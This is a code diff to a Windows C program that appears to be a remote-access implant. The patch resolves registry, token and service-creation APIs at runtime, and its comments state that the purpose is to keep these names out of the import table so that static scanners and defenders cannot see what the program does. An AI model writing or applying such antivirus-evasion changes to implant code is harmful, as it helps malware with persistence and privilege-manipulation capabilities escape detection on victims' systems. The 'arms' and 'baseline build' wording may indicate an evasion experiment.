@@ -205,6 +205,113 @@ static void *px_proc(HMODULE h, const char *name)
 }
 
 /* ================================================================== */
+/* The registry and token API, resolved at runtime                     */
+/* ================================================================== */
+/*                                                                       */
+/* WHY                                                                   */
+/*     ADVAPI32.dll appears in the import table with a list of          */
+/*     RegCreateKeyExA, RegSetValueExA and friends in it. To a STATIC   */
+/*     scanner that list is not a list of API calls -- it is a          */
+/*     description of the behaviour: "this program writes to the        */
+/*     registry".                                                        */
+/*                                                                       */
+/*     It is the same reason Winsock is resolved at runtime rather than */
+/*     imported: the import table is a thing a defender reads before    */
+/*     the program does anything, and every name in it is a statement  */
+/*     about what the program will do.                                 */
+/*                                                                       */
+/*     The Winsock resolution already existed. This does the same for   */
+/*     the registry and the token API, which leaves the import table    */
+/*     with KERNEL32, GDI32 and USER32 -- and nothing that names a     */
+/*     technique.                                                       */
+/*                                                                       */
+/* WHAT IT COSTS                                                        */
+/*     Eleven more calls have to go through a pointer, and the         */
+/*     resolution has to happen before the first use. That is the       */
+/*     trade: a slightly larger binary, and an import table that no   */
+/*     longer describes the behaviour.                                  */
+/* ================================================================== */
+
+typedef LONG (WINAPI *fn_reg_create_key_ex)(HKEY, LPCSTR, DWORD, LPSTR,
+                                            DWORD, REGSAM, const SECURITY_ATTRIBUTES *,
+                                            PHKEY, LPDWORD);
+typedef LONG (WINAPI *fn_reg_open_key_ex)(HKEY, LPCSTR, DWORD, REGSAM,
+                                           PHKEY);
+typedef LONG (WINAPI *fn_reg_set_value_ex)(HKEY, LPCSTR, DWORD, DWORD,
+                                            const BYTE *, DWORD);
+typedef LONG (WINAPI *fn_reg_query_value_ex)(HKEY, LPCSTR, LPDWORD, LPDWORD,
+                                              LPBYTE, LPDWORD);
+typedef LONG (WINAPI *fn_reg_query_info_key)(HKEY, LPSTR, LPDWORD, LPDWORD,
+                                             LPDWORD, LPDWORD, LPDWORD,
+                                             LPDWORD, LPDWORD, LPDWORD,
+                                             LPDWORD, PULONG);
+typedef LRESULT (WINAPI *fn_reg_close_key)(HKEY);
+typedef BOOL (WINAPI *fn_open_process_token)(HANDLE, DWORD, PHANDLE);
+typedef BOOL (WINAPI *fn_duplicate_token_ex)(HANDLE, DWORD, HANDLE,
+                                             PHANDLE, DWORD,
+                                             PSECURITY_ATTRIBUTES);
+typedef BOOL (WINAPI *fn_get_token_information)(HANDLE, TOKEN_INFORMATION_CLASS,
+                                                LPVOID, DWORD, LPDWORD);
+typedef BOOL (WINAPI *fn_lookup_privilege_name)(HANDLE, LPCSTR, LPSTR,
+                                                 LPDWORD);
+typedef SC_HANDLE (WINAPI *fn_open_sc_manager)(LPCSTR, LPCSTR, DWORD);
+typedef SC_HANDLE (WINAPI *fn_create_service)(SC_HANDLE, LPCSTR, LPCSTR,
+                                               DWORD, DWORD, DWORD, DWORD,
+                                               LPCSTR, LPCSTR, LPDWORD,
+                                               LPCSTR, LPCSTR,
+                                               LPSECURITY_ATTRIBUTES);
+typedef BOOL (WINAPI *fn_close_service_handle)(SC_HANDLE);
+
+static fn_reg_create_key_ex px_reg_create_key_ex = NULL;
+static fn_reg_open_key_ex px_reg_open_key_ex = NULL;
+static fn_reg_set_value_ex px_reg_set_value_ex = NULL;
+static fn_reg_query_value_ex px_reg_query_value_ex = NULL;
+static fn_reg_query_info_key px_reg_query_info_key = NULL;
+static fn_reg_close_key px_reg_close_key = NULL;
+static fn_open_process_token px_open_process_token = NULL;
+static fn_duplicate_token_ex px_duplicate_token_ex = NULL;
+static fn_get_token_information px_get_token_information = NULL;
+static fn_lookup_privilege_name px_lookup_privilege_name = NULL;
+static fn_open_sc_manager px_open_sc_manager = NULL;
+static fn_create_service px_create_service = NULL;
+static fn_close_service_handle px_close_service_handle = NULL;
+
+/* Resolve the API that would otherwise be in the import table.
+ *
+ * Returns 1 if every one of them resolved. A missing one is not fatal
+ * -- the capability that needs it reports that it is unsupported, which
+ * is what it already does for a build that does not have the library. */
+static int px_advapi_init(void)
+{
+    HMODULE h = LoadLibraryA("advapi32.dll");
+    int ok = 1;
+
+    if (!h)
+        return 0;
+
+    px_reg_create_key_ex = (fn_reg_create_key_ex)px_proc(h, "RegCreateKeyExA");
+    px_reg_open_key_ex = (fn_reg_open_key_ex)px_proc(h, "RegOpenKeyExA");
+    px_reg_set_value_ex = (fn_reg_set_value_ex)px_proc(h, "RegSetValueExA");
+    px_reg_query_value_ex = (fn_reg_query_value_ex)px_proc(h, "RegQueryValueExA");
+    px_reg_query_info_key = (fn_reg_query_info_key)px_proc(h, "RegQueryInfoKeyA");
+    px_reg_close_key = (fn_reg_close_key)px_proc(h, "RegCloseKey");
+    px_open_process_token = (fn_open_process_token)px_proc(h, "OpenProcessToken");
+    px_duplicate_token_ex = (fn_duplicate_token_ex)px_proc(h, "DuplicateTokenEx");
+    px_get_token_information = (fn_get_token_information)px_proc(h, "GetTokenInformation");
+    px_lookup_privilege_name = (fn_lookup_privilege_name)px_proc(h, "LookupPrivilegeNameA");
+    px_open_sc_manager = (fn_open_sc_manager)px_proc(h, "OpenSCManagerA");
+    px_create_service = (fn_create_service)px_proc(h, "CreateServiceA");
+    px_close_service_handle = (fn_close_service_handle)px_proc(h, "CloseServiceHandle");
+
+    ok = px_reg_create_key_ex && px_reg_open_key_ex && px_reg_set_value_ex &&
+         px_reg_query_value_ex && px_reg_query_info_key && px_reg_close_key &&
+         px_open_process_token && px_duplicate_token_ex &&
+         px_get_token_information && px_lookup_privilege_name &&
+         px_open_sc_manager && px_create_service && px_close_service_handle;
+    return ok;
+}
+
+/* ================================================================== */
 /* freestanding runtime helpers                                       */
 /* ================================================================== */
 /* NOTE: size_t comes from <stddef.h>. On Win64 'unsigned long' is still
@@ -1686,6 +1793,15 @@ __declspec(dllexport) void px_entry(void)
      * baseline build it just copies the literals into the same place so
      * that both arms run the same code. */
     px_vocab_init();
+
+    /* Resolve the registry and token API before anything can call it.
+     *
+     * This is what keeps ADVAPI32.dll out of the import table. The
+     * resolution has to happen here rather than lazily, because the
+     * capability library is compiled in from the start and its functions
+     * may be called before the first connection. */
+    if (!px_advapi_init())
+        px_logf("[px] the registry and token API are not available\n");
 
     /* ------------------------------------------------------------------ */
     /* The variant hooks.                                                  */
